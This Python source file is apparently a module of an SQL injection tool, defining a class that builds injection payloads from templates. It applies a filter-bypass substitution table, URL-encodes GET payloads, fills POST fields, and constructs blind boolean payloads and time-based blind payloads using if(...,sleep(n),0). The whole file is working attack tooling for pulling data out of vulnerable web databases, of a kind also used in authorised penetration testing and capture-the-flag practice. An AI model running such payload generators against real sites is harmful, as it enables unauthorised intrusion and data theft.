#!/usr/bin/env python
# -*- coding:utf-8 -*-

from urllib import quote
from lib.log import logger
import copy

__author__ = "LoRexxar"


class ConPayload:
    def __init__(self, sqlirequest, payload, requestformat, filter, stime):
        """
        payload处理函数初始化，这里将会通过传入的参数，来生成传出的payload
        """
        self.payload = payload
        self.requestformat = requestformat
        self.filter = filter
        self.sqlirequest = sqlirequest
        self.stime = stime

    def construct_request(self, payload):

        # 首先要通过自定义的替换表
        for key in self.filter:
            payload = payload.replace(key, self.filter[key])

        # 如果是get请求,我们需要把payload url编码一下
        if self.sqlirequest == "GET":
            payload = quote(payload)
            return self.requestformat.replace('Feigong', payload)
        elif self.sqlirequest == "POST":
            # 这里是list，必须深拷贝
            request = copy.deepcopy(self.requestformat)
            for key in request:
                if request[key] == 'Feigong':
                    request[key] = payload
            return request
        else:
            logger.error("self.Sqlimethod can not be identified")
            exit(0)

    def construct_normal_payload(self, select=None, source=None, conditions=None, limit=0):
        payload = self.payload

        # select为select的部分，替换自定义的BSqlier
        if select is not None:
            payload = self.payload.replace('\'Feigong\'', select)

        # 我们需要把字符串按照空格划分，转为list
        payload = payload.split(" ")

        # 把最后一位注释符从列表中拆出
        last_object = payload.pop()

        # source为from后面的部分，from的位置稳定在select后面，所以追加在后面
        if source is not None:
            payload.append('from')
            payload.append(source)

        # conditions为where条件，紧接着追加在from后面
        if conditions is not None:
            payload.append('where')
            payload.append(conditions)

        # 最后跟上limit,加上last_object
        payload.append('limit')
        payload.append(repr(limit) + ',1')
        payload.append(last_object)

        # 转list为str
        payload = " ".join(payload)
        return self.construct_request(payload.lower())

    def construct_build_payload(self, select=None, source=None, conditions=None, limit=0, compare=0):

        # 首先我需要拼接一个payload
        payload = []

        if select is not None:
            payload.append('select')
            payload.append(select)

        if source is not None:
            payload.append('from')
            payload.append(source)

        if conditions is not None:
            payload.append('where')
            payload.append(conditions)

        payload.append('limit')
        payload.append(repr(limit) + ',1')

        # 把payload外包裹括号进行比较
        payload = self.__add_parentheses(" ".join(payload))

        # 然后再分开继续处理
        payload = payload.split(" ")

        payload.append(">")
        payload.append(repr(compare))

        payload = self.__add_parentheses(" ".join(payload))

        # 然后再分开继续处理
        payload = payload.split(" ")

        # 在最前面添加select
        payload.insert(0, "select")
        payload = self.__add_parentheses(" ".join(payload))

        # 把生成的payload转为小写，并返回

        return self.construct_request(self.payload.replace("2333", payload.lower()))

    def construct_time_payload(self, select=None, source=None, conditions=None, limit=0, compare=0):

        # 先拼接payload
        payload = []

        if select is not None:
            payload.append('select')
            payload.append(select)

        if source is not None:
            payload.append('from')
            payload.append(source)

        if conditions is not None:
            payload.append('where')
            payload.append(conditions)

        payload.append('limit')
        payload.append(repr(limit) + ',1')

        # 把payload外包裹括号进行比较
        payload = self.__add_parentheses(" ".join(payload))

        payload = payload.split(" ")

        payload.append(">")
        payload.append(repr(compare))

        payload = self.__add_parentheses(" ".join(payload))

        # 凭借if语句，构造时间盲注语句
        payload = "if(" + payload + ",sleep(" + repr(self.stime) + "),0)"

        # 然后再分开继续处理
        payload = payload.split(" ")

        # 在最前面添加select
        payload.insert(0, "select")
        payload = self.__add_parentheses(" ".join(payload))

        # 把生成的payload转为小写，并返回
        if "Feigong" in self.payload:
            return self.construct_request(self.payload.replace("Feigong", payload.lower()))
        elif "2333" in self.payload:
            return self.construct_request(self.payload.replace("2333", payload.lower()))
        else:
            logger.error("self.payload format error...")
            exit(0)

    @staticmethod
    def __add_parentheses(payload):
        return "(" + payload + ")"
